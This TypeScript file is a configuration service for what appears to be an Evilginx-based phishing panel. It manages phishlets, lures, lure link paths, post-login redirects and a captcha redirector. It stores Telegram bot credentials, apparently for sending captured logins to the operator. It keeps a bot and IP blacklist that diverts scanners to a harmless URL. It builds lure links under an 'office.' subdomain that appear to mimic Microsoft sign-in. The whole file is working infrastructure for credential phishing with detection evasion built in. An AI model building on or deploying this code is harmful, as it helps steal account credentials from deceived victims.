import * as fs from "fs";
import * as path from "path";
import chokidar, { FSWatcher } from "chokidar";
import type { Config } from "../types";

/**
 * Phishlet interface representing phishlet configuration
 * Used in configuration parsing
 */
interface Phishlet {
  hostname: string;
  unauth_url: string;
  enabled: boolean;
  visible: boolean;
}

/**
 * Lure interface representing lure configuration
 * Used in handling configuration from the evilginx service
 */
interface Lure {
  hostname: string;
  id: string;
  info: string;
  og_desc: string;
  og_image: string;
  og_title: string;
  og_url: string;
  path: string;
  paused: number;
  phishlet: string;
  redirect_url: string;
  redirector: string;
  ua_filter: string;
}

export class ConfigService {
  private configPath: string;
  private blacklistPath: string;
  private dataDbPath: string;
  private configWatcher: FSWatcher | null = null;
  private blacklistWatcher: FSWatcher | null = null;
  private isInitialized: boolean = false;

  constructor() {
    // Use only the local data directory, avoid accessing ~/.evilginx
    const dataDir = path.resolve(process.cwd(), "data");

    // Ensure data directory exists with proper permissions
    try {
      fs.mkdirSync(dataDir, { recursive: true, mode: 0o755 });
    } catch (error) {
      console.error("Error creating data directory:", error);
      // Continue anyway, we'll handle file creation errors later
    }

    // Set paths for local files only
    this.configPath = path.join(dataDir, "config.json");
    this.blacklistPath = path.join(dataDir, "blacklist.txt");
    this.dataDbPath = path.join(dataDir, "data.db");

    // Initialize files
    this.initializeFiles();

    // Only set up file watchers if we successfully initialized files
    if (this.isInitialized) {
      this.setupWatchers();
    }
  }

  private initializeFiles() {
    try {
      // Create the default config if needed
      this.ensureConfigExists();

      // Create an empty blacklist if needed
      this.ensureBlacklistExists();

      // Create an empty data.db if needed
      this.ensureDataDbExists();

      this.isInitialized = true;
      console.log("File initialization completed successfully");
    } catch (error) {
      console.error("Error initializing files:", error);
      // Do not throw - we'll try to continue with limited functionality
      this.isInitialized = false;
    }
  }

  private ensureConfigExists() {
    try {
      if (!fs.existsSync(this.configPath)) {
        const defaultConfig: Config = {
          blacklist: { mode: "unauth" },
          general: {
            telegram_bot_token: "",
            telegram_chat_id: "",
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: "https://example.com",
          },
          phishlets: {},
          lures: [],
        };

        fs.writeFileSync(
          this.configPath,
          JSON.stringify(defaultConfig, null, 2),
          { mode: 0o644 }
        );
        console.log("Created default config.json at:", this.configPath);
      }
    } catch (error) {
      console.error("Error ensuring config exists:", error);
    }
  }

  private ensureBlacklistExists() {
    try {
      if (!fs.existsSync(this.blacklistPath)) {
        fs.writeFileSync(this.blacklistPath, "", { mode: 0o644 });
        console.log("Created empty blacklist.txt at:", this.blacklistPath);
      }
    } catch (error) {
      console.error("Error ensuring blacklist exists:", error);
    }
  }

  private ensureDataDbExists() {
    try {
      if (!fs.existsSync(this.dataDbPath)) {
        // Just create an empty file - the database service will handle initialization
        fs.writeFileSync(this.dataDbPath, "", { mode: 0o644 });
        console.log("Created empty data.db at:", this.dataDbPath);
      }
    } catch (error) {
      console.error("Error ensuring data.db exists:", error);
      // Create parent directory if it doesn't exist
      try {
        const dirPath = path.dirname(this.dataDbPath);
        fs.mkdirSync(dirPath, { recursive: true, mode: 0o755 });
        fs.writeFileSync(this.dataDbPath, "", { mode: 0o644 });
        console.log(
          "Created empty data.db (second attempt) at:",
          this.dataDbPath
        );
      } catch (retryError) {
        console.error("Failed to create data.db on retry:", retryError);
      }
    }
  }

  private setupWatchers() {
    try {
      this.configWatcher = chokidar.watch(this.configPath, {
        persistent: true,
        ignoreInitial: true,
      });

      this.configWatcher
        .on("change", () => {
          console.log("Config file changed");
        })
        .on("unlink", () => {
          console.log("Config file deleted, recreating...");
          this.ensureConfigExists();
        });

      this.blacklistWatcher = chokidar.watch(this.blacklistPath, {
        persistent: true,
        ignoreInitial: true,
      });

      this.blacklistWatcher
        .on("change", () => {
          console.log("Blacklist file changed");
        })
        .on("unlink", () => {
          console.log("Blacklist file deleted, recreating...");
          this.ensureBlacklistExists();
        });

      console.log("File watchers set up successfully");
    } catch (error) {
      console.error("Error setting up file watchers:", error);
    }
  }

  public async readBlacklist(): Promise<string[]> {
    try {
      if (fs.existsSync(this.blacklistPath)) {
        const content = fs.readFileSync(this.blacklistPath, "utf8");
        return content.split("\n").filter((line) => line.trim() !== "");
      }
      return [];
    } catch (error) {
      console.error("Error reading blacklist:", error);
      return [];
    }
  }

  public async writeBlacklist(ips: string[]): Promise<boolean> {
    try {
      const content = ips.join("\n");
      fs.writeFileSync(this.blacklistPath, content, { mode: 0o644 });
      return true;
    } catch (error) {
      console.error("Error writing blacklist:", error);
      return false;
    }
  }

  public cleanup(): void {
    if (this.configWatcher) {
      this.configWatcher.close();
    }
    if (this.blacklistWatcher) {
      this.blacklistWatcher.close();
    }
  }

  public async readConfig(): Promise<Config | null> {
    try {
      if (fs.existsSync(this.configPath)) {
        const configData = fs.readFileSync(this.configPath, "utf8");
        return JSON.parse(configData) as Config;
      }
      return null;
    } catch (error) {
      console.error("Error reading config:", error);
      return null;
    }
  }

  public async getFullLink(): Promise<{
    fullUrl: string;
    domain: string;
    path: string;
  } | null> {
    try {
      const config = await this.readConfig();
      if (!config) return null;

      const domain = config.general.domain;
      const path = (config.lures && config.lures[0]?.path) || "";
      const fullUrl = domain ? `https://office.${domain}${path}` : "";

      return {
        fullUrl,
        domain,
        path: path.replace(/^\/+/, ""), // Remove leading slash for display
      };
    } catch (error) {
      console.error("Error getting full link:", error);
      return null;
    }
  }

  public async writeConfig(config: Config): Promise<boolean> {
    try {
      const configStr = JSON.stringify(config, null, 2);
      fs.writeFileSync(this.configPath, configStr, { mode: 0o644 });
      return true;
    } catch (error) {
      console.error("Error writing config:", error);
      return false;
    }
  }

  public async updateTelegramSettings(
    botToken: string,
    chatId: string
  ): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) throw new Error("Failed to read config");

      config.general = {
        ...config.general,
        telegram_bot_token: botToken,
        telegram_chat_id: chatId,
      };

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating telegram settings:", error);
      return false;
    }
  }

  public async updateBlacklistMode(blockBots: boolean): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) throw new Error("Failed to read config");

      config.blacklist = {
        ...config.blacklist,
        mode: blockBots ? "unauth" : "off",
      };

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating blacklist mode:", error);
      return false;
    }
  }

  public async updateRedirectUrl(url: string): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) throw new Error("Failed to read config");

      config.general = {
        ...config.general,
        unauth_url: url,
      };

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating redirect URL:", error);
      return false;
    }
  }

  public async updateLinkSettings(
    afterLoginRedirect: string,
    useCaptcha: boolean,
    linkPath: string
  ): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) throw new Error("Failed to read config");

      // Update lures array if it exists
      if (config.lures && config.lures.length > 0) {
        config.lures = config.lures.map((lure) => ({
          ...lure,
          redirect_url: afterLoginRedirect,
          redirector: useCaptcha ? "main" : "",
          path: `/${linkPath.replace(/^\/+/, "")}`, // Ensure single leading slash
        }));
      } else {
        // Create a default lure if none exists
        config.lures = [
          {
            hostname: "",
            id: "",
            info: "",
            og_desc: "",
            og_image: "",
            og_title: "",
            og_url: "",
            path: `/${linkPath.replace(/^\/+/, "")}`,
            paused: 0,
            phishlet: "001",
            redirect_url: afterLoginRedirect,
            redirector: useCaptcha ? "main" : "",
            ua_filter: "",
          },
        ];
      }

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating link settings:", error);
      return false;
    }
  }
}

// Create singleton instance
export const configService = new ConfigService();
